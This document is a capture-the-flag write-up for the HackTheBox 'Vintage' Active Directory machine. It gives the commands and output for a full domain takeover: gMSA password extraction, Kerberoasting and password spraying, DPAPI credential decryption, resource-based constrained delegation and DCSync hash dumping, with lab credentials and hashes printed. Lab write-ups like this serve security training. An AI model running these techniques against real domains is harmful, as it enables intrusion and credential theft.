---
icon: spider-web
---

# HTB-VINTAGE

<figure><img src="../../../../.gitbook/assets/image (284).png" alt=""><figcaption></figcaption></figure>

### Overview

**Target:** HackTheBox Vintage (Hard Windows AD Box)\
**Domain:** vintage.htb\
**DC:** DC01 (10.10.11.45)\
**Initial Credentials:** P.Rosa / Rosaisbest123

**Vintage** is a **Hard-level Windows Active Directory (AD) box** that simulates a realistic multi-stage corporate environment. The challenge revolves around abusing AD misconfigurations and features like **Pre‑Windows 2000 Compatible Access**, **gMSA (Group Managed Service Accounts)**, **DPAPI credential extraction**, and **Resource-Based Constrained Delegation (RBCD)** to escalate from low-privilege domain users to full **Domain Admin** access

***

### Reconnaissance & Initial Access

#### Port Scan

```bash
┌──(sn0x㉿sn0x)-[~/HTB/vintage]
└─$ rustscan -a 10.10.11.45 --ulimit 5000 --range 1-65000 -- -sCV -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/sn0x/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.

Discovered open port 445/tcp on 10.10.11.45
Discovered open port 139/tcp on 10.10.11.45
Discovered open port 53/tcp on 10.10.11.45
Discovered open port 49664/tcp on 10.10.11.45
Discovered open port 135/tcp on 10.10.11.45
Discovered open port 49685/tcp on 10.10.11.45
Discovered open port 389/tcp on 10.10.11.45
Discovered open port 9389/tcp on 10.10.11.45
Discovered open port 88/tcp on 10.10.11.45
Discovered open port 593/tcp on 10.10.11.45
Discovered open port 464/tcp on 10.10.11.45
Discovered open port 62152/tcp on 10.10.11.45
Discovered open port 636/tcp on 10.10.11.45
Discovered open port 49674/tcp on 10.10.11.45
Discovered open port 49668/tcp on 10.10.11.45

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-30 08:48:13Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Key findings:**

* Windows Domain Controller
* Domain: vintage.htb
* Hostname: DC01
* NTLM authentication disabled (Kerberos only)

#### Host File Configuration

```bash
┌──(sn0x㉿sn0x)-[~/HTB/vintage]
└─$ echo "10.10.11.45 vintage.htb DC01.vintage.htb" | sudo tee -a /etc/hosts

[sudo] password for sn0x: 
10.10.11.45 vintage.htb DC01.vintage.htb
```

#### Initial Credential Validation

```bash
# Test provided credentials with Kerberos
netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k
# Result: [+] vintage.htb\P.Rosa:Rosaisbest123
```

***

### Phase 1: BloodHound Enumeration

#### Data Collection

```bash
# Generate Kerberos config
┌──(sn0x㉿sn0x)-[~/HTB/vintage]
└─$ netexec smb dc01.vintage.htb -u 'P.Rosa' -p 'Rosaisbest123' -k --generate-krb5-file vintage-krb5.conf
SMB         dc01            445    dc01             [*]  x64 (name:dc01) (domain:dc01) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01            445    dc01             [-] dc01\P.Rosa:Rosaisbest123 KDC_ERR_WRONG_REALM 


# BloodHound data collection
┌──(sn0x㉿sn0x)-[~/HTB/vintage]
└─$ bloodhound-ce-python -c all -d vintage.htb -u P.Rosa -p Rosaisbest123 -ns 10.10.11.45 --zip
SMB         vintage.htb     445    vintage          [*]  x64 (name:vintage) (domain:htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         vintage.htb     445    vintage          [-] htb\P.Rosa:Rosaisbest123 [Errno Connection error (HTB:88)] [Errno -3] Temporary failure in name resolution
```

#### Key Discovery: Pre-Windows 2000 Computer

* **FS01.vintage.htb** computer object found
* Member of "Pre-Windows 2000 Compatible Access" group
* **Attack Vector:** Computer password likely equals lowercase hostname

#### Password Validation

```bash
# Test FS01$ with lowercase hostname password
┌──(sn0x㉿sn0x)-[~/HTB/vintage]
└─$ netexec ldap vintage.htb -u 'FS01$' -p fs01 -k
# Result: [+] vintage.htb\FS01$:fs01
```

SMB shows the default DC shares:

```
┌──(sn0x㉿sn0x)-[~/HTB/vintage]
└─$ netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k --shares
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\P.Rosa:Rosaisbest123 
SMB         dc01.vintage.htb 445    dc01             [*] Enumerated shares
SMB         dc01.vintage.htb 445    dc01             Share           Permissions     Remark
SMB         dc01.vintage.htb 445    dc01             -----           -----------     ------
SMB         dc01.vintage.htb 445    dc01             ADMIN$                          Remote Admin
SMB         dc01.vintage.htb 445    dc01             C$                              Default share
SMB         dc01.vintage.htb 445    dc01             IPC$            READ            Remote IPC
SMB         dc01.vintage.htb 445    dc01             NETLOGON        READ            Logon server share 
SMB         dc01.vintage.htb 445    dc01             SYSVOL          READ            Logon 
```

***

### Phase 2: GMSA Password Extraction

#### Method 1: Using ldapsearch

```bash
# Get Kerberos ticket
┌──(sn0x㉿sn0x)-[~/HTB/vintage]
└─$ echo "fs01" | kinit 'fs01$'

# Extract GMSA password
┌──(sn0x㉿sn0x)-[~/HTB/vintage]
└─$ ldapsearch -LLL -H ldap://dc01.vintage.htb -Y GSSAPI -b 'DC=vintage,DC=htb' '(&(ObjectClass=msDS-GroupManagedServiceAccount))' msDS-ManagedPassword

```

#### Method 2: Using BloodyAD

<pre class="language-bash"><code class="lang-bash"># Extract GMSA hash
<strong>┌──(sn0x㉿sn0x)-[~/HTB/vintage]
</strong>└─$ bloodyAD -d vintage.htb --host dc01.vintage.htb -u 'fs01$' -p fs01 -k get object 'gmsa01$' --attr msDS-ManagedPassword

# Result: NTLM hash: b3a15bbdfb1c53238d4b50ea2c4d1178
</code></pre>

#### GMSA Hash Validation

```bash
netexec smb dc01.vintage.htb -u 'gmsa01$' -H 'b3a15bbdfb1c53238d4b50ea2c4d1178' -k
# Result: [+] vintage.htb\gmsa01$:b3a15bbdfb1c53238d4b50ea2c4d1178
```

***

### Phase 3: Service Account Privilege Escalation

#### BloodHound Analysis

* **GMSA01$** has GenericWrite + AddSelf over ServiceManagers group
* **ServiceManagers** has GenericAll over three service accounts:
  * svc\_sql (disabled)
  * svc\_ldap
  * svc\_ark

#### Attack Chain Execution

**Step 1: Add GMSA01$ to ServiceManagers**

```bash
# Get TGT for GMSA01$
getTGT.py -k -hashes :b3a15bbdfb1c53238d4b50ea2c4d1178 'vintage.htb/gmsa01$'

# Add to group
bloodyAD -d vintage.htb -k --host dc01.vintage.htb -u 'GMSA01$' -p b3a15bbdfb1c53238d4b50ea2c4d1178 -f rc4 add groupMember ServiceManagers 'GMSA01$'
```

**Step 2: Enable SVC\_SQL Account**

```bash
# Get fresh TGT with updated group membership
getTGT.py -k -hashes :b3a15bbdfb1c53238d4b50ea2c4d1178 vintage.htb/gmsa01$

# Enable account
KRB5CCNAME=gmsa01\$.ccache bloodyAD -d vintage.htb -k --host "dc01.vintage.htb" remove uac svc_sql -f ACCOUNTDISABLE
```

**Step 3: Targeted Kerberoasting**

```bash
# Perform targeted Kerberoast attack
KRB5CCNAME=gmsa01\$.ccache targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb
```

#### Hash Cracking

```bash
# Crack Kerberos hashes with hashcat
hashcat kerberoasting.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt

# Result: svc_sql:Zer0the0ne
```

***

### Phase 4: User Access via Password Spray

#### Password Spray Attack

```bash
# Generate user list from BloodHound data
cat 20250418185542_users.json | jq '.data[].Properties | select(.samaccountname) | .samaccountname' -r > users.txt

# Password spray with discovered password
netexec smb dc01.vintage.htb -u users.txt -p Zer0the0ne -k --continue-on-success

# Result: [+] vintage.htb\C.Neri:Zer0the0ne
```

#### WinRM Access

```bash
# Get Kerberos ticket
kinit c.neri

# Connect via WinRM
evil-winrm -i dc01.vintage.htb -r vintage.htb

# Retrieve user flag
cat C:\Users\C.Neri\desktop\user.txt
# Result: 29f9de83************************
```

***

### Phase 5: Credential Recovery from Windows Credential Manager

#### Credential File Discovery

**Location:** `C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6`

#### DPAPI Decryption Process

**Extract Required Files**

```powershell
# Extract credential file (base64 encoded)
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\users\c.neri\appdata\roaming\microsoft\credentials\C4BB96844A5C9DD45D5B6A9859252BA6'))

# Extract master keys
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b'))
```

**Offline Decryption**

```bash
# Decrypt master key
dpapi.py masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne

# Decrypt credential using master key
dpapi.py credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a

# Result: vintage\c.neri_adm:Uncr4ck4bl3P4ssW0rd0312
```

#### Credential Validation

```bash
netexec smb dc01.vintage.htb -u c.neri_adm -p 'Uncr4ck4bl3P4ssW0rd0312' -k
# Result: [+] vintage.htb\c.neri_adm:Uncr4ck4bl3P4ssW0rd0312
```

***

### Phase 6: Domain Compromise via RBCD

#### BloodHound Path Analysis

**C.Neri\_adm** → GenericWrite → **DelegatedAdmins** → AllowedToAct → **DC01**

#### Resource-Based Constrained Delegation Attack

**Step 1: Add FS01$ to DelegatedAdmins**

```bash
# Get Kerberos ticket
kinit c.neri_adm

# Add computer to delegation group
KRB5CCNAME=/tmp/krb5cc_1000 bloodyAD -d vintage.htb -k --host dc01.vintage.htb add groupMember DelegatedAdmins 'fs01$'
```

**Step 2: Impersonate DC01$ Computer Account**

```bash
# Get ticket as FS01$
kinit fs01$

# Request service ticket impersonating DC01$
getST.py -spn 'cifs/dc01.vintage.htb' -impersonate 'dc01$' 'vintage.htb/fs01$:fs01' -dc-ip dc01.vintage.htb

# Validate impersonation
KRB5CCNAME=dc01\$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache netexec smb dc01.vintage.htb -k --use-kcache
```

**Step 3: DCSync Attack**

```bash
# Extract all domain hashes
KRB5CCNAME=dc01\$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache secretsdump.py 'vintage.htb/dc01$@dc01.vintage.htb' -dc-ip dc01.vintage.htb -k -no-pass

# Key results:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::
# L.Bianchi_adm:1141:aad3b435b51404eeaad3b435b51404ee:6b751449807e0d73065b0423b64687f0:::
```

***

### Phase 7: Domain Admin Access

#### Administrative Shell

```bash
# Get TGT for Domain Admin
getTGT.py vintage.htb/L.Bianchi_adm@dc01.vintage.htb -hashes :6b751449807e0d73065b0423b64687f0

# Connect as Domain Admin
KRB5CCNAME=L.Bianchi_adm@dc01.vintage.htb.ccache evil-winrm -i dc01.vintage.htb -r vintage.htb

# Retrieve root flag
type C:\Users\administrator\desktop\root.txt
# Result: c5cdaf4c************************
```

<figure><img src="../../../../.gitbook/assets/complete (22).gif" alt=""><figcaption></figcaption></figure>

### Attack Chain Summary

1. **Initial Access:** Validated provided credentials (P.Rosa)
2. **Computer Discovery:** Found FS01$ with weak password via BloodHound
3. **GMSA Abuse:** Extracted GMSA01$ password using FS01$ privileges
4. **Service Account Control:** Added GMSA01$ to ServiceManagers group
5. **Kerberoasting:** Enabled and attacked SVC\_SQL service account
6. **Password Spray:** Discovered C.Neri shared password
7. **Credential Recovery:** Extracted C.Neri\_adm credentials from Windows Credential Manager
8. **RBCD Attack:** Leveraged delegation rights to impersonate DC01$
9. **DCSync:** Extracted all domain hashes
10. **Domain Admin:** Achieved full domain compromise as L.Bianchi\_adm

<br>

<figure><img src="../../../../.gitbook/assets/image (286).png" alt=""><figcaption></figcaption></figure>

***

***
